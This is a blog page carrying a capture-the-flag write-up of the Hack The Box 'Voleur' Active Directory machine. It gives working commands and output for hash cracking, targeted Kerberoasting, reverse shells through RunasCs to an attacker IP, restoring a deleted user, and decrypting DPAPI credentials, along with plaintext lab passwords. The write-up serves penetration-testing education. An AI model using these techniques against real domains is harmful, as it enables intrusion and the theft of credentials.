<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Voleur (Windows Medium) | SidePieceVillage</title><meta name="author" content="Jay"><meta name="copyright" content="Jay"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content=" Voleur starts with credentials, but after a nmap you find NTLM is disabled. Using kerberos, we are able to get a bloodhound dump. Checking the..."><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Voleur (Windows Medium)",
  "url": "https://d34db33fb04h.github.io/2025/06/30/Voleur/",
  "image": "https://d34db33fb04h.github.io/img/voleur.png",
  "datePublished": "2025-06-30T22:56:04.000Z",
  "dateModified": "2025-08-21T13:48:39.691Z",
  "author": [
    {
      "@type": "Person",
      "name": "Jay",
      "url": "https://d34db33fb04h.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/j-neon-oval.png"><link rel="canonical" href="https://d34db33fb04h.github.io/2025/06/30/Voleur/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Voleur (Windows Medium)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')

</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">53</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fas fa-user"></i><span> whoami</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Categories</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/htb/"><i class="fa-fw fa-solid fa-cube"></i><span> HTB</span></a></li><li><a class="site-page child" href="/categories/vl/"><i class="fa-fw fas fa-building"></i><span> Vunlab</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Nav</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/n8.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/j-neon-oval.png" alt="Logo"><span class="site-name">SidePieceVillage</span></a><a class="nav-page-title" href="/"><span class="site-name">Voleur (Windows Medium)</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fas fa-user"></i><span> whoami</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Categories</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/htb/"><i class="fa-fw fa-solid fa-cube"></i><span> HTB</span></a></li><li><a class="site-page child" href="/categories/vl/"><i class="fa-fw fas fa-building"></i><span> Vunlab</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Nav</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Voleur (Windows Medium)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-06-30T22:56:04.000Z" title="Created 2025-06-30 17:56:04">2025-06-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-08-21T13:48:39.691Z" title="Updated 2025-08-21 08:48:39">2025-08-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/htb/">htb</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><img src="/img/voleur.png"></p>
<p>Voleur starts with credentials, but after a nmap you find NTLM is disabled. Using kerberos, we are able to get a bloodhound dump. Checking the shares reveals a <em>xlsx</em> file, we can convert it and crack it. Once done, we get access to a excel file with some users and passwords, one user has be deleted. Once on the box, we lateral move to ldap_svc, and find a user that has been deleted. Using powershell, we restore them and then get a shell using the password found from the <em>xlsx</em> file. Then we do to the next directory in the IT share, and find a archived users directory which hold DPAPI credentials. After obtaining the credentials, we find our user able to access a backup in the next directory that contains the SAM, SECURITY, and NTDS files used to dump the Administrator hash.</p>
<p><em>As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor &#x2F; HollowOct31Nyt</em></p>
<h2 id="Initial-Nmap"><a href="#Initial-Nmap" class="headerlink" title="Initial Nmap"></a>Initial Nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-19 09:21:15Z)</span><br><span class="line">135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp  open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">2222/tcp open  ssh           syn-ack ttl 127 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)</span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+vH6cIy1hEFJoRs8wB3O/XIIg4X5gPQ8XIFAiqJYvSE7viX8cyr2UsxRAt0kG2mfbNIYZ+80o9bpXJ/M2Nhv1VRi4jMtc+5boOttHY1CEteMGF6EF6jNIIjVb9F5QiMiNNJea1wRDQ2buXhRoI/KmNMp+EPmBGB7PKZ+hYpZavF0EKKTC8HEHvyYDS4CcYfR0pNwIfaxT57rSCAdcFBcOUxKWOiRBK1Rv8QBwxGBhpfFngayFj8ewOOJHaqct4OQ3JUicetvox6kG8si9r0GRigonJXm0VMi/aFvZpJwF40g7+oG2EVu/sGSR6d6t3ln5PNCgGXw95pgYR4x9fLpn/OwK6tugAjeZMla3Mybmn3dXUc5BKqVNHQCMIS6rlIfHZiF114xVGuD9q89atGxL0uTlBOuBizTaF53Z//yBlKSfvXxW4ShH6F8iE1U8aNY92gUejGclVtFCFszYBC2FvGXivcKWsuSLMny++ZkcE4X7tUBQ+CuqYYK/5TfxmIs=</span><br><span class="line">|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMkGDGeRmex5q16ficLqbT7FFvQJxdJZsJ01vdVjKBXfMIC/oAcLPRUwu5yBZeQoOvWF8yIVDN/FJPeqjT9cgxg=</span><br><span class="line">|   256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILv295drVe3lopPEgZsjMzOVlk4qZZfFz1+EjXGebLCR</span><br><span class="line">3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| p2p-conficker:</span><br><span class="line">|   Checking for Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 48495/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 2 (port 27736/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 3 (port 60782/udp): CLEAN (Timeout)</span><br><span class="line">|   Check 4 (port 36910/udp): CLEAN (Timeout)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2025-08-19T09:21:18</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: 59m59s</span><br></pre></td></tr></table></figure>
<p>Since this is a windows environment, we can start with the simple AD enumeration.</p>
<h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>With credentials, we can get a dump for bloodhound.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">konoha# bloodhound-python -d voleur.htb -u &#x27;ryan.naylor&#x27; -p &#x27;HollowOct31Nyt&#x27; -ns 10.10.11.76 --zip -c Group,LocalAdmin,Session,Trusts,DCOM,RDP,PSRemote,LoggedOn,Container,ObjectProps,ACL --disable-autogc --dns-timeout 20 -dc DC.voleur.htb -k -no-pass</span><br></pre></td></tr></table></figure>
<p>Checking the user descriptions for any juice details.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">konoha# nxc ldap DC.voleur.htb -u ryan.naylor -p &#x27;HollowOct31Nyt&#x27; -k --use-kcache -M get-desc-users</span><br><span class="line">LDAP        DC.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb)</span><br><span class="line">LDAP        DC.voleur.htb   389    DC               [+] voleur.htb\ryan.naylor from ccache</span><br><span class="line">GET-DESC... DC.voleur.htb   389    DC               [+] Found following users:</span><br><span class="line">GET-DESC... DC.voleur.htb   389    DC               User: Administrator description: Built-in account for administering the computer/domain</span><br><span class="line">GET-DESC... DC.voleur.htb   389    DC               User: Guest description: Built-in account for guest access to the computer/domain</span><br><span class="line">GET-DESC... DC.voleur.htb   389    DC               User: krbtgt description: Key Distribution Center Service Account</span><br><span class="line">GET-DESC... DC.voleur.htb   389    DC               User: ryan.naylor description: First-Line Support Technician</span><br><span class="line">GET-DESC... DC.voleur.htb   389    DC               User: marie.bryant description: First-Line Support Technician</span><br><span class="line">GET-DESC... DC.voleur.htb   389    DC               User: lacey.miller description: Second-Line Support Technician</span><br><span class="line">GET-DESC... DC.voleur.htb   389    DC               User: jeremy.combs description: Third-Line Support Technician</span><br></pre></td></tr></table></figure>
<p>Well we have some groups, we can take a note of these and come back later.</p>
<ul>
<li>Restore_Users</li>
<li>First-Line Support Technicians</li>
<li>FIrst-Line Technicians</li>
</ul>
<h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>Let‚Äôs check out what shares we have available to us.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">konoha# nxc smb DC.voleur.htb -u ryan.naylor -p &#x27;HollowOct31Nyt&#x27; -k --shares</span><br><span class="line">SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)</span><br><span class="line">SMB         DC.voleur.htb   445    DC               [+] VOLEUR.HTB\ryan.naylor from ccache</span><br><span class="line">SMB         DC.voleur.htb   445    DC               [*] Enumerated shares</span><br><span class="line">SMB         DC.voleur.htb   445    DC               Share           Permissions     Remark</span><br><span class="line">SMB         DC.voleur.htb   445    DC               -----           -----------     ------</span><br><span class="line">SMB         DC.voleur.htb   445    DC               ADMIN$                          Remote Admin</span><br><span class="line">SMB         DC.voleur.htb   445    DC               C$                              Default share</span><br><span class="line">SMB         DC.voleur.htb   445    DC               Finance</span><br><span class="line">SMB         DC.voleur.htb   445    DC               HR</span><br><span class="line">SMB         DC.voleur.htb   445    DC               IPC$            READ            Remote IPC</span><br><span class="line">SMB         DC.voleur.htb   445    DC               IT              READ</span><br><span class="line">SMB         DC.voleur.htb   445    DC               NETLOGON        READ            Logon server share</span><br><span class="line">SMB         DC.voleur.htb   445    DC               SYSVOL          READ            Logon server share</span><br></pre></td></tr></table></figure>
<p>Connecting via SMB.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">konoha# impacket-smbclient &#x27;voleur.htb/ryan.naylor@DC.voleur.htb&#x27; -k -no-pass -dc-ip 10.10.11.76</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"># ls</span><br><span class="line">drw-rw-rw-          0  Wed Jan 29 03:40:17 2025 .</span><br><span class="line">drw-rw-rw-          0  Wed Jan 29 03:10:01 2025 ..</span><br><span class="line">-rw-rw-rw-      16896  Thu May 29 17:23:36 2025 Access_Review.xlsx</span><br><span class="line"># mget *</span><br></pre></td></tr></table></figure>
<p>From the IT share got <code>Access_Review.xlsx</code>, we can convert it to a hash and try to crack.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">konoha# office2john Access_Review.xlsx &gt; access.hash</span><br><span class="line">konoha# john --wordlist=/usr/share/wordlists/rockyou.txt access.hash</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 AVX 4x / SHA512 128/128 AVX 2x AES])</span><br><span class="line">Cost 1 (MS Office version) is 2013 for all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 100000 for all loaded hashes</span><br><span class="line">Will run 8 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">&lt;SNIP&gt;        (Access_Review.xlsx)</span><br></pre></td></tr></table></figure>

<p>After cracking and opening. We have passwords and a user that was deleted(Possibly can restore him).</p>
<p>Looking at svc_ldap they has permission <code>WriteSPN</code> over svc_winrm. After setting with bloodyAD we can GetUserSPNs again for svc_winrm‚Äôs hash.<br><img src="/img/voleur2.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">konoha# bloodyAD -v DEBUG -d voleur.htb -u svc_ldap  -k --dc-ip 10.10.11.76 --host DC.voleur.htb set object svc_winrm servicePrincipalName -v HOST/svc_winrm</span><br><span class="line"></span><br><span class="line">konoha# impacket-GetUserSPNs -dc-ip 10.10.11.76 &#x27;voleur.htb/svc_ldap&#x27; -request-user svc_winrm -k -no-pass -outputfile svc_winrm</span><br></pre></td></tr></table></figure>

<p>svc_winrm password cracks and we get a TGT and WinRM on the box.</p>
<h2 id="On-Box"><a href="#On-Box" class="headerlink" title="On Box"></a>On Box</h2><p>As svc_winrm, we need to use RunaCs.exe to give ourself a shell as svc_ldap. </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; .\RCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r 10.10.14.2:443 -t 0</span><br><span class="line">[*] Warning: The logon for user &#x27;svc_ldap&#x27; is limited. Use the flag combination --bypass-uac and --logon-type &#x27;8&#x27; to obtain a more privileged token.</span><br><span class="line"></span><br><span class="line">[+] Running in session 0 with process function CreateProcessWithLogonW()</span><br><span class="line">[+] Using Station\Desktop: Service-0x0-2d33258$\Default</span><br><span class="line">[+] Async process &#x27;C:\ProgramData\ms.exe&#x27; with pid 2796 created in background.</span><br></pre></td></tr></table></figure>

<p>As svc_ldap, we need find DeletedObjects using powershell.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Windows\system32&gt; Get-ADObject -Filter &#x27;isDeleted -eq $true -and objectClass -eq &quot;user&quot;&#x27; -IncludeDeletedObjects -Properties objectSid, lastKnownParent, ObjectGUID | Select-Object Name, ObjectGUID, objectSid, lastKnownParent | Format-List</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Name            : Todd Wolfe</span><br><span class="line">                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db</span><br><span class="line">ObjectGUID      : 1c6b1deb-c372-4cbb-87b1-15031de169db</span><br><span class="line">objectSid       : S-1-5-21-3927696377-1337352550-2781715495-1110</span><br><span class="line">lastKnownParent : OU=Second-Line Support Technicians,DC=voleur,DC=htb</span><br></pre></td></tr></table></figure>

<p>Then restore this object(user).</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Windows\system32&gt; Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db -TargetPath &quot;OU=Second-Line Support Technicians,DC=voleur,DC=htb&quot;</span><br></pre></td></tr></table></figure>

<p>We can now get a shell as todd.wolfe same way as before.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; .\RCs.exe todd.wolfe NightT1meP1dg3on14 powershell -r 10.10.14.2:443 -t 0</span><br><span class="line">[*] Warning: The logon for user &#x27;todd.wolfe&#x27; is limited. Use the flag combination --bypass-uac and --logon-type &#x27;8&#x27; to obtain a more privileged token.</span><br><span class="line"></span><br><span class="line">[+] Running in session 0 with process function CreateProcessWithLogonW()</span><br><span class="line">[+] Using Station\Desktop: Service-0x0-e18972$\Default</span><br><span class="line">[+] Async process &#x27;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#x27; with pid 5340 created in background.</span><br></pre></td></tr></table></figure>

<h2 id="DPAPI-AGAIN-Where-in-a-home-directory-duh"><a href="#DPAPI-AGAIN-Where-in-a-home-directory-duh" class="headerlink" title="DPAPI AGAIN, Where in a home directory duh!!"></a>DPAPI AGAIN, Where in a home directory duh!!</h2><p>After getting a shell we look into the IT directory at the root which has First,Second,Third OUs. We can go into the second and see a archived directory. This holds the Users Directory which we have access to ours. We can from this, gather the keys we need for DPAPI. </p>
<p>Exfiltrating the keys via smb didn‚Äôt work, Base64 encoding and then decrypting on attacker machine.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">konoha# impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password &#x27;NightT1meP1dg3on14&#x27;</span><br><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[MASTERKEYFILE]</span><br><span class="line">Version     :        2 (2)</span><br><span class="line">Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88</span><br><span class="line">Flags       :        0 (0)</span><br><span class="line">Policy      :        0 (0)</span><br><span class="line">MasterKeyLen: 00000088 (136)</span><br><span class="line">BackupKeyLen: 00000068 (104)</span><br><span class="line">CredHistLen : 00000000 (0)</span><br><span class="line">DomainKeyLen: 00000174 (372)</span><br><span class="line"></span><br><span class="line">Decrypted key with User Key (MD4 protected)</span><br><span class="line">Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83</span><br><span class="line">konoha# impacket-dpapi credential -f 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83</span><br><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[CREDENTIAL]</span><br><span class="line">LastWritten : 2025-01-29 12:55:19+00:00</span><br><span class="line">Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)</span><br><span class="line">Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)</span><br><span class="line">Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)</span><br><span class="line">Target      : Domain:target=Jezzas_Account</span><br><span class="line">Description :</span><br><span class="line">Unknown     :</span><br><span class="line">Username    : jeremy.combs</span><br><span class="line">Unknown     : qT3V9pLXyN7W4m</span><br></pre></td></tr></table></figure>
<p>After getting credentials we again get a shell like we did before.</p>
